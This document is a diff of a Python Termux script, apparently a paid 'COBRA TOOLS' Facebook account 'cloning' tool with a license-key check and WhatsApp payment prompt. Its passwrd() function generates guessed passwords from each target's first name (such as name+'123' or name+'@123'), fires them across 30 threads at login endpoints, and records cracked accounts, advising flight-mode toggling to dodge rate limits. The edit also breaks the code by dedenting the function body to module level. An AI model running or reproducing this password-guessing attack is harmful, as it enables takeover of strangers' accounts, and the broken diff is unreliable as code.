@@ -109,12 +109,14 @@ pwpluss,pwnya=[],[]
  
 
 #------------[ FIROZ- ]--------------#
-  def back():
-	login()
-FIROZ="FIROZ"
-imt="SINTHI"
-ak="CLASS3-"
+def back():
+    login()
 
+FIROZ = "FIROZ"
+imt = "SINTHI"
+ak = "CLASS3-"
+
+# ANSI COLOR STYLE
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
 H = '\x1b[1;92m'
@@ -123,85 +125,52 @@ B = '\x1b[1;94m'
 U = '\x1b[1;95m' 
 O = '\x1b[1;96m'
 N = '\x1b[0m'    
-Z = "\033[1;30m"
-sir = '\033[41m\x1b[1;97m'
-x = '\33[m' # DEFAULT
-m = '\x1b[1;91m' #RED +
-k = '\033[93m' # KUNING +
-h = '\x1b[1;92m' # HIJAU +
-hh = '\033[32m' # HIJAU -
-u = '\033[95m' # UNGU
-kk = '\033[33m' # KUNING -
-b = '\33[1;96m' # BIRU -
-p = '\x1b[0;34m' # BIRU +
-asu = random.choice([m,k,h,u,b])
- 
-###----------[ ANSII COLOR STYLE ]---------- ###
- 
-Z = "\x1b[0;90m"     # Hitam
-M = "\x1b[38;5;196m" # Merah
-H = "\x1b[38;5;46m"  # Hijau
-K = "\x1b[38;5;226m" # Kuning
-B = "\x1b[38;5;44m"  # Biru
-U = "\x1b[0;95m"     # Ungu
-O = "\x1b[0;96m"     # Biru Muda
-P = "\x1b[38;5;231m" # Putih
-J = "\x1b[38;5;208m" # Jingga
-A = "\x1b[38;5;248m" # Abu-Abu
- 
-###----------[ RICH COLOR STYLE ]---------- ###
- 
-Z2 = "[#000000]" # Hitam
-M2 = "[#FF0000]" # Merah
-H2 = "[#00FF00]" # Hijau
-K2 = "[#FFFF00]" # Kuning
-B2 = "[#00C8FF]" # Biru
-U2 = "[#AF00FF]" # Ungu
-N2 = "[#FF00FF]" # Pink
-O2 = "[#00FFFF]" # Biru Muda
-P2 = "[#FFFFFF]" # Putih
-J2 = "[#FF8F00]" # Jingga
-A2 = "[#AAAAAA]" # Abu-Abu
- 
-#--------------------[ CONVERTER-BULAN ]--------------#
 
-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
+# RICH COLOR STYLE
+Z2 = "[#000000]"  # Hitam
+M2 = "[#FF0000]"  # Merah
+H2 = "[#00FF00]"  # Hijau
+K2 = "[#FFFF00]"  # Kuning
+B2 = "[#00C8FF]"  # Biru
+U2 = "[#AF00FF]"  # Ungu
+N2 = "[#FF00FF]"  # Pink
+O2 = "[#00FFFF]"  # Biru Muda
+P2 = "[#FFFFFF]"  # Putih
+J2 = "[#FF8F00]"  # Jingga
+A2 = "[#AAAAAA]"  # Abu-Abu
+
+# CONVERTER-BULAN
+dic = {'1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June', '7': 'July', '8': 'August', '9': 'September', '10': 'October', '11': 'November', '12': 'December'}
 tgl = datetime.datetime.now().day
-bln = dic[(str(datetime.datetime.now().month))]
+bln = dic[str(datetime.datetime.now().month)]
 thn = datetime.datetime.now().year
-okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-date = str(tgl)+'/'+str(bln)+'/'+str(thn)
-ltx = int(lt()[3])
-if ltx > 12:
-    a = ltx-12
-    tag = "PM"
-else:
-    a = ltx
-    tag = "AM"
-#------------------[ MACHINE-SUPPORT ]---------------#
- 
-def alvino_xy(u):
-        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
-def FIROZ(u):
-        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-def clear():
-	os.system('clear')
-def back():
-	login()
-	
-	import getpass
 
-attemps = 0
+# MACHINE-SUPPORT
+def alvino_xy(u):
+    for e in u + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.005)
 
 import os
-os.system('clear')
+import time
+
+def FIROZ(u):
+    for e in u + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.01)
+
+def clear():
+    os.system('clear')
+
+import getpass
+
 attempts = 0
-max_attempts = 12345677901  # Set your desired maximum number of attempts
+max_attempts = 3  # Set your desired maximum number of attempts
 
 while attempts < max_attempts:
-    print(f"""
+    print("""
 \033[0;96m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 \033[0;96m║   \033[1;93m██████╗\033[1;97m ██████╗\033[1;92m ██████╗\033[1;94m ██████╗  \033[1;91m█████╗   \033[0;96m║
 \033[0;96m║  \033[1;93m██╔════╝\033[1;97m██╔═══██╗\033[1;92m██╔══██╗\033[1;94m██╔══██╗\033[1;91m██╔══██╗  \033[0;96m║
@@ -224,14 +193,13 @@ while attempts < max_attempts:
     os.system('espeak -a 300 " input tools username "')
     username = input(' \033[0;92mEnter Username: ')
     os.system('espeak -a 300 "input tools password "')
-    password = input(' \033[0;93mEnter Password: ')
+    password = getpass.getpass(' \033[0;93mEnter Password: ')
     attempts += 1
 
     # Add an exit condition (e.g., after a certain number of attempts)
     if attempts >= max_attempts:
         print("Maximum attempts reached. Exiting.")
         break
-
 
     if username == 'FIROZ' and password == 'MUBIN':
         print(' \033[0;92mLog in successfully.')
@@ -241,8 +209,9 @@ while attempts < max_attempts:
         print(' Incorrect Pass Please Check And Try Again ')
         os.system('espeak -a 300 " password, incorrect,"')
         os.system('clear')
-        attemps += 1
+        attempts += 1
         continue
+
 #------------------[ LOGO-LAKNAT ]-----------------#
 logo =""" 
 \033[0;96m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
@@ -263,7 +232,7 @@ logo ="""
 ╠══•>Whatsapp                : 01605092962  \033[1;95m  ║\033[1;96m 
 ╠══•>TOOLS                   : Paid         \033[1;96m  ║ \033[1;31m   
 ╠══•>VERSION                 : 0.1           \033[1;31m ║\033[1;36m 
-\033[1;97m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
+\033[1;97m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
 os.system('clear')
 print(logo)
 os.system('espeak -a 300 " Your  Real  Name,"')
@@ -590,81 +559,85 @@ def setting():
 def passwrd():
     os.system('clear')
     print(logo)
-    print(f"\033[97;1m[\033[92;1m+\033[97;1m]\033[1;93m USER NAME\033[1;96m     :\033[1;97m "+NameX)
-    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93mTODAY'S DATE :\033[1;92m "+date)
-    print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
-    current_time = time.strftime("%I:%M %p")  # Get current time in AM/PM format
-	print(f'\033[97;1m[\033[92;1m+\033[97;1m] \033[1;94mStarting Time \033[1;96m:\033[1;92m {current_time}')
-    	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[1;96mCloning Speed Ultra Super Fast")
-	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[1;96mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
-    print('\033[0;97m===============================================')
-    with tred(max_workers=30) as pool:
-        for yuzong in id2:
-            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-            frs = nmf.split(' ')[0]
-            pwv = []
-            if len(nmf)<6:
-                if len(frs)<3:
-                    pass
-                else:
-                    pwv.append(frs+'12')
-                    pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'12345')
-                    pwv.append(frs+'123456')
-                    pwv.append(nmf)
-                    pwv.append('57273200')
-                    pwv.append(frs+'@123')
-                    pwv.append(frs+'@')
-                    pwv.append(frs+'@@')
-                    pwv.append(frs+'@@@')
-                    pwv.append(frs+'@@@@')
-                    pwv.append(frs+'@#')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'11')
-                    pwv.append(frs+'111')
+    print(f"\033[97;1m[\033[92;1m+\033[97;1m]\033[1;93m USER NAME\033[1;96m     :\033[1;97m {NameX}")
+print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93mTODAY'S DATE :\033[1;92m {date}")
+print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m {str(len(id))}')
+current_time = time.strftime("%I:%M %p")  # Get current time in AM/PM format
+print(f'\033[97;1m[\033[92;1m+\033[97;1m] \033[1;94mStarting Time \033[1;96m:\033[1;92m {current_time}')
+print("\033[97;1m[\033[92;1m+\033[97;1m] \033[1;96mCloning Speed Ultra Super Fast")
+print("\033[97;1m[\033[92;1m+\033[97;1m] \033[1;96mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
+print('\033[0;97m===============================================')
+
+with tred(max_workers=30) as pool:
+    for yuzong in id2:
+        idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
+        frs = nmf.split(' ')[0]
+        pwv = []
+        if len(nmf) < 6:
+            if len(frs) < 3:
+                pass
             else:
-                if len(frs)<3:
-                    pwv.append(nmf)
-                else:
-                    pwv.append(frs+'12')
-                    pwv.append(frs+'123')
-                    pwv.append(frs+'1234')
-                    pwv.append(frs+'12345')
-                    pwv.append(frs+'123456')
-                    pwv.append(nmf)
-                    pwv.append('57273200')
-                    pwv.append(frs+'@123')
-                    pwv.append(frs+'@')
-                    pwv.append(frs+'@@')
-                    pwv.append(frs+'@@@')
-                    pwv.append(frs+'@@@@')
-                    pwv.append(frs+'@#')
-                    pwv.append(frs+'1122')
-                    pwv.append(frs+'11')
-                    pwv.append(frs+'111')
-            if 'ya' in pwpluss:
-                for xpwd in pwnya:
-                    pwv.append(xpwd)
-            else:pass
-            if 'mobile' in method:
-                pool.submit(crack,idf,pwv)
-            elif 'free' in method:
-                pool.submit(crackfree,idf,pwv)
-            elif 'touch' in method:
-                pool.submit(crackfree,idf,pwv)
-            elif 'mbasic' in method:
-                pool.submit(crackfree,idf,pwv)
+                pwv.append(frs+'12')
+                pwv.append(frs+'123')
+                pwv.append(frs+'1234')
+                pwv.append(frs+'12345')
+                pwv.append(frs+'123456')
+                pwv.append(nmf)
+                pwv.append('57273200')
+                pwv.append(frs+'@123')
+                pwv.append(frs+'@')
+                pwv.append(frs+'@@')
+                pwv.append(frs+'@@@')
+                pwv.append(frs+'@@@@')
+                pwv.append(frs+'@#')
+                pwv.append(frs+'1122')
+                pwv.append(frs+'11')
+                pwv.append(frs+'111')
+        else:
+            if len(frs) < 3:
+                pwv.append(nmf)
             else:
-                pool.submit(crackfree,idf,pwv)
-    print('\n\033[1;37m===================================')
-    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
-    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(ok))
-    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
-    print('\n\033[1;37m===================================')
-    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
-    os.system("python nono.py")
-    exit()
+                pwv.append(frs+'12')
+                pwv.append(frs+'123')
+                pwv.append(frs+'1234')
+                pwv.append(frs+'12345')
+                pwv.append(frs+'123456')
+                pwv.append(nmf)
+                pwv.append('57273200')
+                pwv.append(frs+'@123')
+                pwv.append(frs+'@')
+                pwv.append(frs+'@@')
+                pwv.append(frs+'@@@')
+                pwv.append(frs+'@@@@')
+                pwv.append(frs+'@#')
+                pwv.append(frs+'1122')
+                pwv.append(frs+'11')
+                pwv.append(frs+'111')
+        if 'ya' in pwpluss:
+            for xpwd in pwnya:
+                pwv.append(xpwd)
+        else:
+            pass
+        if 'mobile' in method:
+            pool.submit(crack, idf, pwv)
+        elif 'free' in method:
+            pool.submit(crackfree, idf, pwv)
+        elif 'touch' in method:
+            pool.submit(crackfree, idf, pwv)
+        elif 'mbasic' in method:
+            pool.submit(crackfree, idf, pwv)
+        else:
+            pool.submit(crackfree, idf, pwv)
+
+print('\n\033[1;37m===================================')
+print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m' + time.strftime("%H:%M") + " " + tag)
+print('\033[97;1m[\033;92m•\033[97;1m] OK :\033[0;92m %s ' % (ok))
+print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s ' % (cp))
+print('\n\033[1;37m===================================')
+woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
+os.system("python nono.py")
+exit()
+
  
 #--------------------[ METODE-B-API ]-----------------#
  
@@ -753,33 +726,46 @@ def crackfree(idf,pwv):
  
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
  
-if __name__=='__main__':
-    try:os.mkdir('OK')
-    except:pass
-    try:os.mkdir('CP')
-    except:pass
-    try:os.system('touch .prox.txt')
-    except:pass
+
+
+if __name__ == '__main__':
+    try:
+        os.mkdir('OK')
+    except:
+        pass
+
+    try:
+        os.mkdir('CP')
+    except:
+        pass
+
+    try:
+        os.system('touch .prox.txt')
+    except:
+        pass
+
     def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrFIROZ -cov', 'r').read()
-	r1=requests.get("https://raw.githubusercontent.com/Clone54/Aproval/main/Aproval.txt").text
-	if key1 in r1:
-		os.system('clear')
-		login()
-	else:
-		os.system("clear")
-		banner()
-		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m FREE USER NOT COME INBOX")
-		time.sleep(0.0010)
-		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m COBRA TOOLS Daily Update")
-		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
-		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
-		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+FIROZ+key1)
-		name = input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Name : ")
-		input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
-		time.sleep(1.5)
-		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+FIROZ+''+key1
-		os.system('am start https://wa.me/+8801871528249?text=' + tks)
-		Subscraption() 
-Subscraption() 
-login()
+        key1 = open('/data/data/com.termux/files/usr/bin/.mrFIROZ -cov', 'r').read()
+        r1 = requests.get("https://raw.githubusercontent.com/Clone54/Aproval/main/Aproval.txt").text
+
+        if key1 in r1:
+            os.system('clear')
+            login()
+        else:
+            os.system("clear")
+            banner()
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m FREE USER NOT COME INBOX")
+            time.sleep(0.0010)
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m COBRA TOOLS Daily Update")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m " + ak + FIROZ + key1)
+            name = input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Name : ")
+            input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
+            time.sleep(1.5)
+            tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20' + name + '%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20' + ak + FIROZ + '' + key1
+            os.system('am start https://wa.me/+8801871528249?text=' + tks)
+            Subscraption()
+
+    Subscraption()
+    login()
